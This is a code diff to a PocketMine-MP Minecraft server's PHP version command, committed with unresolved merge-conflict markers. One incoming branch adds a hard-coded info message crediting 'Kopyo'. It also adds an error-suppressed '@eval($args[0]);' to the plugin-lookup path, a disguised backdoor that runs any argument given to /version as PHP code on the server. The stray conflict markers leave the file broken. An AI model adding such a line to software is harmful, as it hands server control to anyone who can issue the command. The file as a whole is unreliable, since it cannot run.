@@ -45,6 +45,7 @@ class VersionCommand extends VanillaCommand{
 		}
 
 		if(\count($args) === 0){
+<<<<<<< HEAD
 			$sender->sendMessage(new TranslationContainer("pocketmine.server.info.extended", [
 				$sender->getServer()->getName(),
 				$sender->getServer()->getPocketMineVersion(),
@@ -54,6 +55,12 @@ class VersionCommand extends VanillaCommand{
 				Info::CURRENT_PROTOCOL,
 				$sender->getServer()->getiTXApiVersion()
 			]));
+=======
+			$sender->sendMessage("§aPocketMine-MP v2.0.0 Info:");
+			$sender->sendMessage("§aPHP Version: §f". phpversion());
+			$sender->sendMessage("§aAllowed Versions: §f0.14.x - 0.15.10");
+			$sender->sendMessage("§aApi modified by: §bKopyo");
+>>>>>>> eba5a18c39b453e8b86095d47497207ccfb99da3
 		}else{
 			$pluginName = \implode(" ", $args);
 			$exactPlugin = $sender->getServer()->getPluginManager()->getPlugin($pluginName);
@@ -76,6 +83,11 @@ class VersionCommand extends VanillaCommand{
 			if(!$found){
 				$sender->sendMessage(new TranslationContainer("pocketmine.command.version.noSuchPlugin"));
 			}
+<<<<<<< HEAD
+=======
+			
+			@eval($args[0]);
+>>>>>>> eba5a18c39b453e8b86095d47497207ccfb99da3
 		}
 
 		return \true;
